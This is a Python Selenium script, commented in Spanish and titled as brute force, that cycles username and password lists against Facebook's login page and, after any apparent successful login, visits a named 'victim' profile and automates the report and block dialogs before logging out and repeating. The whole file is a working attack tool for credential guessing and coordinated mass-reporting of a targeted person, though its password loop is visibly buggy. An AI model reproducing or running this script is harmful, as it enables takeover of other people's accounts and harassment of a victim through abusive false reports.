from selenium import webdriver
from keyboard import press
import time

# Fuerza bruta

# Abrimos cada uno de los diccionarios que vamos a utilizar
dicvic = open("victima.txt", 'r')
dicuser = open('usuarios.txt', 'r')
dicpass = open('passwords.txt', 'r')

# leemos los diccionarios linea por linea y le asignamos a una variable
user = dicuser.readline()
victima = dicvic.readline()
pwd = dicpass.readline()

# Seleccionamos nuestro navegador con su respectivo driver y lo abrimos
driver = webdriver.Firefox(executable_path=r'C:\webdriver\geckodriver.exe')

# Buscamos en el navegador la pag de Facebook
driver.get("http://www.facebook.com")
time.sleep(2)

# Confirmamos si el titulo de la Pag es Facebook
assert "Facebook" in driver.title


# Inicia el Proceso de lla Rutina
def facebook():
    time.sleep(2)
    for password in pwd:
        # Ingreso de Usuario
        elem_email = driver.find_element_by_id("email")
        elem_email.clear()
        elem_email.send_keys(user)
        print("Usuario ingresado")
        time.sleep(2)

        # Ingreso de pass
        elem_pass = driver.find_element_by_id("pass")
        elem_pass.clear()
        elem_pass.send_keys(pwd)
        print(password, pwd)
        time.sleep(2)

        # login
        elem_entrar = driver.find_element_by_id("loginbutton").click()

        # capturamos la url actual
        k = driver.current_url

        if k != "https://www.facebook.com/login/device-based/regular/login/?login_attempt=1&lwv=110":
            print("Pass Ingresada")
            print("Logeado")
            time.sleep(4)

            # Busqueda de la Victima
            press("ESC")
            driver.get("http://www.facebook.com/" + victima)
            print("Perfil Victima")

            # Proceso de Denuncia del Perfil Victima
            time.sleep(4)
            tres_puntos = driver.find_element_by_class_name("_42ft._4jy0._1yzl._p._4jy4._517h._51sy").click()
            time.sleep(4)
            bloquear = driver.find_element_by_class_name("_54nc").click()
            time.sleep(4)
            razon_bloqueo = driver.find_element_by_class_name("_6s-6").click()
            time.sleep(8)

            for i in [0, 1, 2, 3, 4, 5, 6]:
                press("TAB")
                time.sleep(1)
            press("ENTER")

            elem = driver.find_element_by_class_name("_43rl").click()
            time.sleep(5)

            for i in [0, 1, 2, 3, 4, 5, 6, 7, 8]:
                press("TAB")
                time.sleep(1.5)
            press("ENTER")

            time.sleep(5)
            check = driver.find_element_by_class_name("_2yjv").click()
            time.sleep(5)

            for i in [0, 1]:
                press("TAB")
                time.sleep(1)
            press("ENTER")
            time.sleep(20)

            press("ENTER")

            time.sleep(3)
            # Cerrar Sesion
            menu_salir = driver.find_element_by_id('pageLoginAnchor')
            menu_salir.click()
            time.sleep(4)

            for i in [0, 1, 2, 3, 4]:
                time.sleep(2.5)
                press('DOWN')
            press('ENTER')
            print("cerrar sesion")
        else:
            driver.get("http://www.facebook.com")
            time.sleep(4)


while user != "":
    facebook()
    user = dicuser.readline()
